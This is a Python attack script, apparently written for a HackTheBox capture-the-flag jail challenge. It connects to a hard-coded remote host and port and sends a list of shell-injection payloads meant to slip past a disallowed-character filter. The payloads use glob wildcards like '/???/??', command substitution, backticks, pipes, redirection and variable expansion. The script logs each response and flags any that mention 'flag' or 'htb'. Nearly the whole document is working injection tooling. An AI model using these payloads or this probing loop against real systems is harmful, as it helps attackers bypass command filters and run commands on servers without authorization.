import socket
import time
import json
import sys

# Configuration
HOST = "94.237.123.87"
PORT = 44123

# Targeted payloads based on what worked in the initial scan
targeted_payloads = [
    # Exploring with /bin/cp (which worked in the initial scan)
    "/???/??",                       # This matched /bin/cp in the initial scan
    
    # Trying different patterns that might match other binaries
    "/???/?",                        # Try to match /bin/a, /bin/b, etc.
    "/???/???",                      # Try to match /bin/abc
    "/???/????",                     # Try to match /bin/abcd
    
    # Trying different paths
    "/??/?",                         # Try to match /xx/x
    "/??/??",                        # Try to match /xx/xx
    "/??/???",                       # Try to match /xx/xxx
    
    # Trying to use command substitution with the patterns that worked
    "$(/??/?)",                      # Execute result of /xx/x
    "$(/??/??)",                     # Execute result of /xx/xx
    "$(/??/???)",                    # Execute result of /xx/xxx
    
    # Trying to use redirection with the patterns that worked
    "/???/?? > /???/????",           # Redirect output to /tmp/file
    "/???/?? > /???/?",              # Redirect output to /tmp/x
    
    # Trying to use pipes
    "/???/?? | /???/??",             # Pipe output from one command to another
    
    # Trying to use environment variables
    "$?",                            # Last exit code
    "$$",                            # Current PID
    "$0",                            # Script name
    "$1",                            # First argument
    "$2",                            # Second argument
    
    # Trying to use shell built-ins
    "echo $?",                       # Echo last exit code
    "echo $$",                       # Echo current PID
    "echo $0",                       # Echo script name
    
    # Trying to use wildcards in different ways
    "/?",                            # Match single character in root
    "/??",                           # Match two characters in root
    "/???",                          # Match three characters in root
    
    # Trying to use special characters that are allowed
    "$(/???/?? $(echo /))",          # Nested command substitution
    "$(echo /???/??)",               # Command substitution with echo
    
    # Trying to use parameter expansion
    "${PATH}",                       # Expand PATH variable
    "${HOME}",                       # Expand HOME variable
    "${USER}",                       # Expand USER variable
    
    # Trying to use arithmetic expansion
    "$((1+1))",                      # Basic arithmetic
    "$((2*3))",                      # Multiplication
    "$((10/2))",                     # Division
    
    # Trying to use brace expansion
    "{1,2,3}",                       # Brace expansion
    "/???/{1,2,3}",                  # Brace expansion with path
    
    # Trying to use command substitution with different syntax
    "$(echo hello)",                 # Command substitution with echo
    "`echo hello`",                  # Command substitution with backticks
    
    # Trying to use file descriptors
    ">&2",                           # Redirect stdout to stderr
    "2>&1",                          # Redirect stderr to stdout
    
    # Trying to use shell options
    "set -x",                        # Enable debug mode
    "set +x",                        # Disable debug mode
]

def connect_to_service():
    """Connects to the remote service."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))
        print(f"[+] Connected to {HOST}:{PORT}")
        
        # Receive initial banner
        banner = sock.recv(4096).decode('utf-8', errors='ignore')
        print("[+] Banner received:")
        print(banner)
        
        return sock
    except Exception as e:
        print(f"[-] Error connecting to {HOST}:{PORT}: {e}")
        return None

def send_payload(sock, payload):
    """Sends a single payload and returns the response."""
    try:
        print(f"\n[+] Sending payload: {repr(payload)}")
        sock.sendall((payload + '\n').encode())
        time.sleep(1)  # Give the server time to respond
        
        # Receive response
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        print("[*] Response:")
        print(response)
        
        return {"payload": payload, "response": response}
    except Exception as e:
        print(f"[-] Error sending payload: {e}")
        return {"payload": payload, "error": str(e)}

def main():
    """Main function to run the targeted payloads."""
    results = []
    
    sock = connect_to_service()
    if not sock:
        sys.exit(1)
    
    try:
        for i, payload in enumerate(targeted_payloads):
            print(f"\n[*] Testing payload {i+1}/{len(targeted_payloads)}")
            result = send_payload(sock, payload)
            results.append(result)
            
            # Save results after each test
            with open('targeted_results.json', 'w') as f:
                json.dump(results, f, indent=2)
            
            # Check if the response contains anything interesting
            response = result.get("response", "")
            if "flag" in response.lower() or "htb" in response.lower():
                print("[!] Potential flag found in response!")
    
    except KeyboardInterrupt:
        print("\n[!] Testing interrupted by user")
    except Exception as e:
        print(f"[-] Error during testing: {e}")
    finally:
        try:
            sock.close()
        except:
            pass
        
        print("\n[+] Testing complete. Results saved to targeted_results.json")
        print("[*] Promising payloads to try manually:")
        for result in results:
            payload = result.get("payload", "")
            response = result.get("response", "")
            if len(response) > 0 and "Broken@Shell$" not in response and "Error: Command contains disallowed characters" not in response:
                print(f"  - {payload}")

if __name__ == "__main__":
    main()
